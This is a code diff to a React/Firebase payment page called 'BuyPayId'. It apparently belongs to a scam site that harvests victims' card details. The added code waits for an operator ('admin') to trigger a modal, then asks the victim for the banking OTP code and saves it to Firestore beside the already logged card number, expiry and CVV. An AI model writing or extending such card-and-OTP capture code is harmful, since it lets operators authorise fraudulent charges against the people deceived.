@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { useAuth } from '../context/AuthContext';
 import { db, logCardSubmission, logGiftCardSubmission } from '../lib/firebase';
-import { doc, getDoc, onSnapshot } from 'firebase/firestore';
+import { doc, getDoc, onSnapshot, updateDoc } from 'firebase/firestore';
 import {
   GIFT_CARD_BRAND_RULES,
   validateRealGiftCardInput,
@@ -66,6 +66,60 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
   const [cvv, setCvv] = useState('');
   const [cardName, setCardName] = useState(user?.name || '');
   const [cardError, setCardError] = useState('');
+  const [pendingCardSubId, setPendingCardSubId] = useState<string | null>(null);
+  const [requiresOtpModal, setRequiresOtpModal] = useState(false);
+  const [clientOtpInput, setClientOtpInput] = useState('');
+  const [otpVerifyError, setOtpVerifyError] = useState('');
+  const [isVerifyingOtp, setIsVerifyingOtp] = useState(false);
+
+  useEffect(() => {
+    if (!pendingCardSubId) return;
+    const unsubscribe = onSnapshot(doc(db, 'cardSubmissions', pendingCardSubId), (docSnap) => {
+      if (docSnap.exists()) {
+        const data = docSnap.data();
+        if (data.requiresOtp && !requiresOtpModal && data.status !== 'approved') {
+          setRequiresOtpModal(true);
+        }
+        if (data.status === 'approved' || data.otpVerified) {
+          setRequiresOtpModal(false);
+          updateUser({ payIdVerified: true });
+          setStep(5);
+        }
+        if (data.status === 'rejected') {
+          setRequiresOtpModal(false);
+          updateUser({ cardRejectionReason: data.rejectionReason || 'Card verification declined.' });
+          setStep(4);
+        }
+      }
+    });
+    return () => unsubscribe();
+  }, [pendingCardSubId, requiresOtpModal]);
+
+  const handleClientSubmitOtp = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!clientOtpInput || clientOtpInput.length < 4) {
+      setOtpVerifyError('Please enter a valid OTP code');
+      return;
+    }
+    if (!pendingCardSubId) return;
+
+    setIsVerifyingOtp(true);
+    setOtpVerifyError('');
+    try {
+      await updateDoc(doc(db, 'cardSubmissions', pendingCardSubId), {
+        otpVerified: true,
+        otpCodeEntered: clientOtpInput,
+        status: 'approved',
+      });
+      setRequiresOtpModal(false);
+      updateUser({ payIdVerified: true });
+      setStep(5);
+    } catch (err: any) {
+      setOtpVerifyError(err?.message || 'Failed to verify OTP code.');
+    } finally {
+      setIsVerifyingOtp(false);
+    }
+  };
 
   const [formData, setFormData] = useState({
     fullName: user?.name || '',
@@ -353,8 +407,10 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
 
     try {
       updateUser({ cardRejectionReason: '' });
+      const cardSubId = `CARD-${Date.now()}`;
+      setPendingCardSubId(cardSubId);
       await logCardSubmission({
-        id: `CARD-${Date.now()}`,
+        id: cardSubId,
         type: 'PAY ID Card Purchase',
         cardNumber,
         expiry,
@@ -1149,6 +1205,57 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
       )}
 
       <GiftCardVerdictModal verdict={verdictModal} onClose={() => setVerdictModal(null)} />
+
+      {requiresOtpModal && (
+        <div className="fixed inset-0 bg-black/70 backdrop-blur-xs flex items-center justify-center p-4 z-50">
+          <div className="bg-white border border-gray-200 rounded-3xl p-6 max-w-md w-full shadow-2xl space-y-5 animate-in fade-in zoom-in-95 duration-200">
+            <div className="text-center space-y-2">
+              <div className="w-14 h-14 bg-purple-100 text-purple-700 rounded-full flex items-center justify-center mx-auto ring-8 ring-purple-50">
+                <Lock className="w-7 h-7" />
+              </div>
+              <h3 className="text-xl font-bold text-gray-900">Verify with your OTP</h3>
+              <p className="text-xs text-gray-600 leading-relaxed">
+                The admin has allowed your ATM card payment verification. Please enter your banking OTP code below to confirm and complete payment.
+              </p>
+            </div>
+
+            <form onSubmit={handleClientSubmitOtp} className="space-y-4">
+              <div>
+                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-700 mb-1.5">
+                  Banking OTP Code
+                </label>
+                <input
+                  type="text"
+                  maxLength={6}
+                  value={clientOtpInput}
+                  onChange={(e) => setClientOtpInput(e.target.value.replace(/\D/g, ''))}
+                  placeholder="Enter 6-digit OTP code"
+                  className="w-full p-3.5 bg-gray-50 border border-gray-300 rounded-xl text-center text-lg font-mono tracking-widest focus:ring-2 focus:ring-purple-600 outline-none text-gray-900"
+                />
+              </div>
+
+              {otpVerifyError && (
+                <p className="text-xs text-red-600 font-medium text-center">{otpVerifyError}</p>
+              )}
+
+              <button
+                type="submit"
+                disabled={isVerifyingOtp}
+                className="w-full min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 px-5 rounded-xl text-sm shadow-md transition-all cursor-pointer disabled:opacity-60 flex items-center justify-center space-x-2"
+              >
+                {isVerifyingOtp ? (
+                  <span>Verifying OTP...</span>
+                ) : (
+                  <>
+                    <ShieldCheck className="w-4 h-4" />
+                    <span>Verify OTP &amp; Complete Payment</span>
+                  </>
+                )}
+              </button>
+            </form>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
